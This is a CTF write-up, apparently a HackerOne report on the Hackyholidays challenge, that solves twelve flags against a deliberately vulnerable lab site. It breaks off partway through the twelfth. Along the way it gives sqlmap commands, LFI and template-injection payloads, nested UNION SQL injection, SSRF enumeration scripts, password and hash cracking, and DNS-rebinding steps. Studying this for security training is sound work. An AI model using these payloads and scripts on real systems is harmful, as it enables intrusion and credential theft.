# Complete destruction of the Grinch server

## Report Details
- **Report ID**: 1065885
- **URL**: https://hackerone.com/reports/1065885
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-24T15:43:21.104Z
- **Disclosed**: 2021-01-12T17:56:48.652Z

## Reporter
- **Username**: shamollash
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Hackyholidays


# flag 1

First flag is just a matter of reading `/robots.txt` file:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```


# flag 2

Visiting `/s3cr3t-ar3a` and opening it with developer tools gets the second flag:


	flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}


It is inserted in the DOM via some obfuscated javascript code buried in `/assets/js/jquery.min.js`


```
h1_0='la',h1_1='}',
h1_2='',
h1_3='f',
h1_4='g',
h1_5='{b7ebcb75',h1_6='8454-',
h1_7='cfb9574459f7',
h1_8='-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 );
```


# flag3 /people-rater

The people rater app references entries via something like


	https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=

where the id parameter is base64 encoding of  `{"id":NUMBER}`

Setting `NUMBER=1` immediatly gives the flag:

```
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com

{ "id":"eyJpZCI6MX0=",
  "name":"The Grinch",
  "rating":"Amazing in every possible way!",
  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

# flag4 /swag-shop

The swag shop sells some itmes but in order to make a purchase you need a valid login as shown by this request

```
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com

id=1
```

which gives the error:

	{"error":"You are not logged in"}

Fuzzing via ffuf we can find `/swag-shop/api/sessions` which contains some interesting stuff

	{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
	
In particular one session is longer than others and base64 decoding of it gives

```
{
  "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

From javascript source we see that the session cookie is called  `token`.

After many fuzzing tries, the key to proceed is matching **all** response code, even 400 errors:

```
ffuf -u  https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ \
-w common.txt \
-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
-t 4 -mc all  -fs 155
```

which finally gives a `user` endpoint which was not known before:

```
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

Visiting this endpoint we find this error message:

```
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com


HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 06:52:00 GMT
Content-Type: application/json
Connection: close
Content-Length: 35

{"error":"Missing required fields"}
```

Probably the api wants the user id. Fuzzing again with a list of common parameter names
	
```
ffuf -u  'https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' \
-w burp-parameter-names.txt \
-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
-t 4 -mc all  -fs 155
```

we understand that the parameter is called (not very surprisingly after all) `uuid`.

This call gets the 4th flag

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com

{
  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username":"grinch",
  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

In the end, the session cookie probably was not necessary.


# flag5 /secure-login


The login form seems to indicate that there are different responses for invalid username vs. just wrong password.

So we first try to discover a valid usernameexploting the different responses (with a list of common usernames).
After finding that **access** is a valid user, we try to bruteforce his password, again with a list of very common password.

It's just a matter of seconds to obtain a valid set of credentials:

```
username=access&password=computer
```


After loggin in we get a cookie like this one

	securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;

which is base64 encoding of

	{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}


Changing the cookie and setting `admin:true` immediately brings us to a page where we can download 

	my_secure_files_not_for_you.zip

This zip file is password protected but john the ripper, and in particular zip2john, will easily reveal the password (`hahahaha`)

	zip2john my_secure_files_not_for_you.zip >zip.hashes
	john zip.hashes ## this gives you the password

Finally in `flag.txt` extracted from zip file we find

	flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

We also find a gross private picture of the grinch, not very interesting after all.


# flag6 /my-diary/

Grinch diary screams for LFI (Local File Inclusion)

	https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

and at least it's true in its current directory. If we simply try to get the `index.php` we otbain the source code:


```
GET /my-diary/?template=index.php HTTP/1.1
Host: hackyholidays.h1ctf.com

...

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
```

The usage of `strreplace` has a classic vulnerability: it will not recursively remove all `admin.php` occurences. If we start from 

	XXXadmin.phpYYY
	
what remains is

	XXXYYY
	
So for instance

	adminadmin.php.php --> admin.php


The following payload gets the source code of `secretadmin.php` (which contains the flag), despite the extra layer of "security":


```
GET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1

...

<?php
if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
?>

[...SNIP...]

flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
```


# flag7 /hate-mail

Examining the mail preview function

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

our attention is immediately captured by that `{{template:file.html}}`. We begin tampering in search of some kind of LFI, but that only exposes the existance of a `templates/` subdirectory. Directory Index is enabled there, so we get to knwow about a particular file

	38dhs_admins_only_header.html

A simple GET of the file gives us forbidden and also tampering with the `preview_markup` parameter only gives us an error message:


```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
	preview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D

...

You do not have access to the file 38dhs_admins_only_header.html
```

Key vulnerability here is that the `{{template:file}}` construction seems to have different validation if used with `preview_markup` or `preview_data` parameter

So if in `preview_markup` we define the `{{name}}` placeholder and try to get the file within this placeholder in `preview_data` we are able to access the admin file and obtain the flag:

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup={{name}}&preview_data={"name"%3a"{{template%3a38dhs_admins_only_header.html}}","email"%3a"alice%40test.com"}

...
  <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```


# flag 8 /forum

Here our objective is accessing the admin area. By basic recon we know that there are at least user grinch and user max. Basic password bruteforcing does not give any result, and also tampering with message and section identifiers (`/forum/N/M`)

Searching for common files and directories with ffuf only revelas a `phpmyadmin`.

	ffuf  -t 4 -u https://hackyholidays.h1ctf.com/forum/FUZZ -w common.txt -mc all -fc 404
	...
	1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
	2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
	login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
	phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
	
	
Fuzzing gives us nothing so we revert to search for the source code of the forum, maybe is on github. This "google dork" 

	"Grinch Forum" site:github.com

reveals
	
	https://github.com/Grinch-Networks/forum

There are no evident vulnerbilities in the source code so we look at the history and find a particular commit where the auhtor forgot to properly purge sensitive data:


```
commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:36:07 2020 +0000

    small fix

diff --git a/models/Db.php b/models/Db.php
index 5bea1f5..1dc435c 100755
--- a/models/Db.php
+++ b/models/Db.php
@@ -131,7 +131,7 @@ class Db {
      */
     static public function read(){
         if( gettype(self::$read) == 'string' ) {
-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$read = new DbConnect( false, '', '','' );
```

Those credentials work on phpmyadmin where we are able to find what looks like md5 hash for the passwords:


```
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF    1
2 	max   	388E015BC43980947FCE0E5DB16481D1 
```

A visit on crackstation.net immediately reveals the grinch password

	35D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
	
With these credentials we are able to access a message which finally reveals the Grinch secret plan:

```
https://hackyholidays.h1ctf.com/forum/3/2


We've launched our recon server, gathered intelligence and pin pointed Santa's location!
Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!

flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

We must find that server, and hopefully launch the Grinch weapons against itself!

# flag9 /evil-quiz


We begin the quiz with name `pippo`

	POST /evil-quiz
	name=pippo
	
and post some answers

	POST /evil-quiz/start HTTP/1.1
	Host: hackyholidays.h1ctf.com
	
	ques_1=4&ques_2=3&ques_3=2

What immediately got our attention was this sentence in the score page:

	There is 1 other player(s) with the same name as you!
	

Our first interpretation was that maybe we have to trick this other user to do something via XSS or html link, maybe tampering with our name parameter. But, what was strange, was that even with "xss names" there was always some user with our same username.

After some tampering trying to evade xss filters we got a different message

	There is 0 other player(s) with the same name as you!

It was not immediately evident why, until we tested one character at a time and we learnt that it was the `'` to make the differenc. That smells like SQL Injection.

Actually at some point we begin getting these answers:

```
name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
```

Bingo! It is a second order blind sql injection. Sqlmap to the rescue: given a valid session cookie and at least one complete answer to questions in that session (no matter the evil score) these command is sufficient to extract all the information we need:

	
```
sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' \
--data 'name=NOME' \
--second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' \
--random-agent --not-string 'There is 0 other player' \
--technique=B --level=3 --risk=3 \
--cookie 'session=***'  -D quiz -T admin --dump
```

Key here are a couple of things to note here:

- `--second-url` parameters tells sqlmap the page to check our injection results in a different page
- we explicitly give a `--not-string` to look for false result
- `--risk 3` is necessary to let sqlmap try OR based blind injection
- db and table were identified by previious runs of sqlmap, what you have above is the final command
- you cannot specify more than 1 thread because of second order page request (otherwhise one thread will interfere with other threads' result)

Seeing this message told us that we were on the right path

```
...
[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
...
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-3268' OR 6136=6136-- ibKa
    Vector: OR [INFERENCE]
```

And finally, with some patience we get the info we were looking for:

```
Database: quiz
Table: admin
[1 entry]
+----+----------+-------------------+
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

With admin credentials we immediately get the flag:

	flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
	
# flag10 /signup-manager

Simple fuzzing reveals nothing very useful apart the existence of and `admin.php` page which is not directly accessibile via HTTP.

Comment in the home page reveals existence of a `README.md` file4:

```
<!-- See README.md for assistance -->
<!DOCTYPE html>
...
```

This file describes the signupmanager source code which is readily available as `signupmanager.zip`.

It is clear that we have to create a user that has admin rights, but it seems not possible to overflow the string length, given that all paramters are quite strongly filtered:

- password is hashed
- username, first and last name are all subject to length restrictions, for instance

```
$fistname=substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
```

It remains only the age paramter which is subject to these restrictions and conversions:

```
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
	
$age = intval($_POST["age"]);
}
```
Apparentely it won't be possibile to get an "overflow" but PHP is not strongly typed an setting age **9e9** we pass first check (it's a numeric value, in scientific notation), and as a string it's only 3 characters long. But fortunately for us

```
php > print intval("9e9");
9000000000
```

With this in mind, we are able to get correct length for lastname in order to have a Y as last character of our user line written on disk:

The following paylod finally gives us a valid admin user

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com

action=signup&username=grinch54321&password=a&age=9e9&firstname=aaa&lastname=bbbbbbbbY
```

The flag was

```
<p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
<p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
            </div>
```


Tommorrow let's hope to get into the Gringh recon server and maybe DDOS it!

# flag11

We start from `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59` where we read:

	We are currently developing an API, apologies for anything that doesn't work quite right


Every api endpoint seems to give this error

	https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api
 	
	error	"This endpoint cannot be visited from this IP address"

Probably we have to find a way to trick the server in sending requests to this API endpoints via some SSRF.


Initial tought is about the image paramter in these requests:

	https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9

```
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
{"image":"r3c0n_server_4fdk59\/uploads\/1254314b8292b8f790862d63fa5dce8f.jpg","auth":"99c00d3eef70847ac4888ae85d0b4c7e"}
```

After spending a lot of time trying to reverse engineer the algorithm which signs (via auth paramter) the image paramter.
It was not (at least trying with common passwords as salts) a weak hash of SALT+image, and also length extension attack did not produce anything.

So back to the basic recon.
Initially we did not put much attention on the hash paramter in  `/r3c0n_server_4fdk59/album?hash=` but it is clearly vulnerable so sql injection.

In a few seconds sqlmap reveals

```
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+


Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

No other information seems available. Key to understand how to proceed was observing that in the following request the first UNION paramter is used to get the photo from the db


```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!! 
```

We are able to confirm that there is a SQLi inside a SQLi (inserting the second one as first union column of the first injection) like in the following example:

	GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"1' order by 3--+-",2,3--+- HTTP/1.1

Finally we are able to insert our data like in the following example, obtaining a valid signature:
	
```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,0x41--+-",2,3--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

     <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL0EiLCJhdXRoIjoiNjAxNDZjMGY5YTQ0YTgyNWZhYTIzZTJkZDE3OWMxM2QifQ==">
```

which is 

	{"image":"r3c0n_server_4fdk59\/uploads\/A","auth":"60146c0f9a44a825faa23e2dd179c13d"}
	
Now we proceed with the assumtion that this image path is used by the server to interrogate the api

We try some common endpoints with this script

```
#!/bin/sh

while read word; do

/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/$word" |xxd -p | tr -d '\n')
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl" |grep -v 404
echo
done
```

The script can be run via:  `cat wordlist.txt | script.sh`

We find two endpoints observing the different responses given by the server:

- ping
- user

While testing the `user` endpoint we notice two different responses for 

- `user?xxx=1`
- `user?username=x`

```
user?xxx=1: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/eHh4PTEiLCJhdXRoIjoiY2FhNzlmNjdiZDZlZDlmOGE5MGI4NjJjOGZmY2RkMGIifQ==
Expected HTTP status 200, Received: 400

user?username=x: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9eCIsImF1dGgiOiI2ZDRhZDg4NTRmNzk5ZTI0NmZmZTEwZTZiZGFkYjE2YiJ9
Expected HTTP status 200, Received: 204
```

This means that user endpoint expects a username parameter, and later on we also find a password paramter.

But now what? Key observation was that by inserting a `%` as username we have again  different response:

```
user?username=%: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9
Invalid content type detected
```

This is working but the server does not return a valid image as expected by the caller.

This probably means that username paramter is inserted in a query like

	username LIKE '$username'

This mean we are not able to extract data directly but we should be able to enumerate one character at a time:

	username=a%
	username=b%
	...
	username=g%
	
At `g%` we get a diffrrent response (Invalid content type) so maybe...

	username=gr%
	username=gri%
	
This can be scripted with something like this:

```
#!/bin/sh

start=$1
for word in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/user?pass=$start$word%" |xxd -p | tr -d '\n')
echo path: ${path}
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl"  | grep -i invalid
echo
done
```

Example usage: `./user-enumeration-script.sh grin`

After some tedious work we found the credentials **grinchadmin** **s4nt4sucks** 
These credentials work on /attack-box button giving us flag11:

	flag{07a03135-9778-4dee-a83c-7ec330728e72}

Tomorrow, let's see what is inside this evil box!

# flag12


The grinch attack box fires DDOS against given IPs

- 203.0.113.33 	
- 203.0.113.53 	
- 203.0.113.213

Attacks are launched via this kind of request

	GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1

that redirects you on a page with many similar requests that give the Grinch a feedback on his ddos success of failure

	GET /attack-box/launch/332e283ebf958178fdae26345b921c68.json?id=0 HTTP/1.1	
Attack requests contain (base64 encoded) something like 

	{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

It is evident from tampering with the target value, that there is some kind of authentication: target of the attack and hash must match.

	{"target":"203.0.113.33", "hash":"5f2940d65ca4140cc18d0878bc398955"}
	{"target":"203.0.113.53", "hash":"2814f9c7311a82f1b822585039f62607"}
	{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}

While in flag11 there probably was a sound hashing mechanism (like HMAC), here it's easy to find a problem
because the Grinch used the infamous combination of `md5($salt.$ip)`, choosing the salt from well known passwords.

By concatenating the first ip `203.0.113.33` with password chosen from the famous *rockyou* list and by
using hashcat we are able to see that the first hash corresponds to this:

	5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
	
Following commands show how we build a wordlist with the concatened IP address used as input for haschat:

```
cat rockyou.txt | awk '{print $0"203.0.113.33"}' > list.txt
hashcat -O -m0 -a0 hash.txt list.txt 

Dictionary cache built:
* Filename..: list.txt
* Passwords.: 14344392
* Bytes.....: 312054211
* Keyspace..: 14343895
* Runtime...: 2 secs

5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955
```

So the salt is `mrgrinch463`

This is easily confirmed by creating this request, now lecit.

	{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}

Unfortunately this only gives

```
Host Information for: 127.0.0.1
Local target detected, aborting attack
Setting Target Information
Getting Host Information for: 127.0.0.1
Local target detected, aborting attack
```

We then started to use hostnames instead of ip addresses but we got strange responses from the server which put us in a wrong direction (maybe too many hackers trying to DDOS the Grinch server with many requests...).

Anyay, when situation stabilizes it is clear that some basic trick do not work, like using `127.0.0.1.xip.io`. The grinch server specifically resolves hostname
and checks that a DDOS is not launched against itself: 127.0.0.1. That is definitely our target, wherever the Grinch hides.

Given the extensive checks that the grinch does to see if his DDOS is successful, an idea comes to mind. What if
whe set up a name server that responds with a non local ip on first requests, and then change the resolution to 127.0.0.1?
Maybe second time the check against local IPs is not in place (a classic TOCTOU - Time Of Check Time Of Use - vulnerability).

Our hypotesis is based on the observation of this beavhiour:

```
Setting Target Information
Getting Host Information for: 192.168.1.1.xip.io
Host resolves to 192.168.1.1
Spinning up botnet
Launching attack against: 192.168.1.1.xip.io / 192.168.1.1
ping 192.168.1.1
64 bytes from 192.168.1.1: icmp_seq=1 ttl=118 time=22.9 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=118 time=21.2 ms
64 bytes from 192.168.1.1: icmp_seq=3 ttl=118 time=15.9 ms
Host still up, maybe try again?
```

-  Get host information: resolves, check is different that 127.0.0.1
-  then attack

Maybe in the attack phase 127.0.0.1 is not checked again.

So we started our fake nameserver using dnschef

	dnschef -i 0.0.0.0 --fakeip 192.168.1.1
	
having in mind that we should be quite quick and launch it again with different options:	

	dnschef -i 0.0.0.0 --fakeip 127.0.0.1


What happens on the grinch server is described below:

- first check for hostname, it resolves to a non local ip so is good and botnet is spinned up:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=0 HTTP/1.1

